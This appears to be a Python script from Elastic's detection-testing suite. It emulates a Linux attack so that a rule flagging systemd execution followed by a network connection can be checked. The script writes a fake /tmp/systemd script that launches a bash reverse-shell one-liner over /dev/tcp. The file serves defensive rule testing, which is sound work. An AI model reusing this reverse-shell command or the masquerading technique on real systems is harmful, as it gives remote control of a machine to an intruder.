# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import os
import sys
from pathlib import Path

from . import RtaMetadata, common

metadata = RtaMetadata(
    uuid="517a466b-f11f-4469-8e5a-a39f4edf333a",
    platforms=["linux"],
    endpoint=[
        {
            "rule_name": "Systemd Execution Followed by Network Connection",
            "rule_id": "6644d936-36a2-4d21-95f3-4826e6b61b9b",
        },
    ],
    techniques=["T1543", "T1059", "T1071"],
)


@common.requires_os(*metadata.platforms)
def main() -> None:
    shell_command = "/tmp/bash"
    shell_args = "-c 'sh -i >& /dev/tcp/8.8.8.8/53 0>&1'"
    parent_process = "/tmp/systemd"

    common.execute(["cp", "/bin/bash", shell_command])

    # Create the fake parent process script
    with Path(parent_process).open("w", encoding="utf-8") as script:
        script.write("#!/bin/bash\n")
        script.write(f"{shell_command} {shell_args}\n")

    # Make the script executable
    common.execute(["chmod", "+x", parent_process])
    common.execute(["chmod", "+x", shell_command])

    # Use os.fork() to simulate the parent/child relationship
    pid = os.fork()
    if pid == 0:
        # Child process: Execute the fake parent process script
        os.execl(parent_process, parent_process)  # noqa: S606
    else:
        # Parent process: Wait for the child process to complete
        os.waitpid(pid, 0)
        common.log("Fake parent process script executed")
        common.log("RTA execution completed.")

    # Cleanup
    common.remove_file(parent_process)
    common.remove_file(shell_command)  # Remove the copied /tmp/bash


if __name__ == "__main__":
    sys.exit(main())
